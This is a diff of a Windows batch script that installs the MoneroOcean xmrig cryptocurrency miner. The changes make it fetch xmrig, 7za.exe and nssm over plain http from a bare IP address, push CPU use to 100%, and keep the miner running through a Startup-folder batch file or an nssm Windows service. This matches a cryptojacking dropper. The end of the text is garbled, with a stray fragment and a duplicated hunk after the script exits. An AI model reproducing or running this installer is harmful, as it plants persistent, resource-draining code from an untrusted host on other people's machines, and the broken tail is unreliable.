@@ -142,7 +142,7 @@ rmdir /q /s "%USERPROFILE%\moneroocean" >NUL 2>NUL
 IF EXIST "%USERPROFILE%\moneroocean" GOTO REMOVE_DIR0
 
 echo [*] Downloading MoneroOcean advanced version of xmrig to "%USERPROFILE%\xmrig.zip"
-powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('92.118.57.150:8080/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://92.118.57.150:8080/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
 if errorlevel 1 (
   echo ERROR: Can't download MoneroOcean advanced version of xmrig
   goto MINER_BAD
@@ -152,7 +152,7 @@ echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('92.118.57.150:8080/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://92.118.57.150:8080/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
@@ -196,7 +196,7 @@ echo [*] Unpacking "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
 powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%USERPROFILE%\moneroocean')"
 if errorlevel 1 (
   echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
-  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('92.118.57.150:8080/7za.exe', '%USERPROFILE%\7za.exe')"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://92.118.57.150:8080/7za.exe', '%USERPROFILE%\7za.exe')"
   if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
@@ -242,6 +242,122 @@ powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ 
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
+
+copy /Y "%USERPROFILE%\moneroocean\config.json" "%USERPROFILE%\moneroocean\config_background.json" >NUL
+powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config_background.json'" 
+
+rem preparing script
+(
+echo @echo off
+echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
+echo if errorlevel 1 goto ALREADY_RUNNING
+echo start /low %%~dp0xmrig.exe %%^*
+echo goto EXIT
+echo :ALREADY_RUNNING
+echo echo Monero miner is already running in the background. Refusing to run another one.
+echo echo Run "taskkill /IM xmrig.exe" if you want to remove background miner first.
+echo :EXIT
+) > "%USERPROFILE%\moneroocean\miner.bat"
+
+rem preparing script background work and work under reboot
+
+if %ADMIN% == 1 goto ADMIN_MINER_SETUP
+
+if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+  goto STARTUP_DIR_OK
+)
+if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
+  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
+  goto STARTUP_DIR_OK  
+)
+
+echo ERROR: Can't find Windows startup directory
+exit /b 1
+
+:STARTUP_DIR_OK
+echo [*] Adding call to "%USERPROFILE%\moneroocean\miner.bat" script to "%STARTUP_DIR%\moneroocean_miner.bat" script
+(
+echo @echo off
+echo "%USERPROFILE%\moneroocean\miner.bat" --config="%USERPROFILE%\moneroocean\config_background.json"
+) > "%STARTUP_DIR%\moneroocean_miner.bat"
+
+echo [*] Running miner in the background
+call "%STARTUP_DIR%\moneroocean_miner.bat"
+goto OK
+
+:ADMIN_MINER_SETUP
+
+echo [*] Downloading tools to make moneroocean_miner service to "%USERPROFILE%\nssm.zip"
+powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://92.118.57.150:8080/nssm.zip', '%USERPROFILE%\nssm.zip')"
+if errorlevel 1 (
+  echo ERROR: Can't download tools to make moneroocean_miner service
+  exit /b 1
+)
+
+echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%USERPROFILE%\moneroocean')"
+if errorlevel 1 (
+  echo [*] Downloading 7za.exe to "%USERPROFILE%\7za.exe"
+  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://92.118.57.150:8080/7za.exe', '%USERPROFILE%\7za.exe')"
+  if errorlevel 1 (
+    echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
+    exit /b 1
+  )
+  echo [*] Unpacking "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+  "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\nssm.zip" >NUL
+  if errorlevel 1 (
+    echo ERROR: Can't unpack "%USERPROFILE%\nssm.zip" to "%USERPROFILE%\moneroocean"
+    exit /b 1
+  )
+  del "%USERPROFILE%\7za.exe"
+)
+del "%USERPROFILE%\nssm.zip"
+
+echo [*] Creating moneroocean_miner service
+sc stop moneroocean_miner
+sc delete moneroocean_miner
+"%USERPROFILE%\moneroocean\nssm.exe" install moneroocean_miner "%USERPROFILE%\moneroocean\xmrig.exe"
+if errorlevel 1 (
+  echo ERROR: Can't create moneroocean_miner service
+  exit /b 1
+)
+"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppDirectory "%USERPROFILE%\moneroocean"
+"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppPriority BELOW_NORMAL_PRIORITY_CLASS
+"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStdout "%USERPROFILE%\moneroocean\stdout"
+"%USERPROFILE%\moneroocean\nssm.exe" set moneroocean_miner AppStderr "%USERPROFILE%\moneroocean\stderr"
+
+echo [*] Starting moneroocean_miner service
+"%USERPROFILE%\moneroocean\nssm.exe" start moneroocean_miner
+if errorlevel 1 (
+  echo ERROR: Can't start moneroocean_miner service
+  exit /b 1
+)
+
+echo
+echo Please reboot system if moneroocean_miner service is not activated yet (if "%USERPROFILE%\moneroocean\xmrig.log" file is empty)
+goto OK
+
+:OK
+echo
+echo [*] Setup complete
+pause
+exit /b 0
+
+:strlen string len
+setlocal EnableDelayedExpansion
+set "token=#%~1" & set "len=0"
+for /L %%A in (12,-1,0) do (
+  set/A "len|=1<<%%A"
+  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
+)
+endlocal & set %~2=%len%
+exit /b
+
+
+
+
+ Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 
 copy /Y "%USERPROFILE%\moneroocean\config.json" "%USERPROFILE%\moneroocean\config_background.json" >NUL
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config_background.json'" 
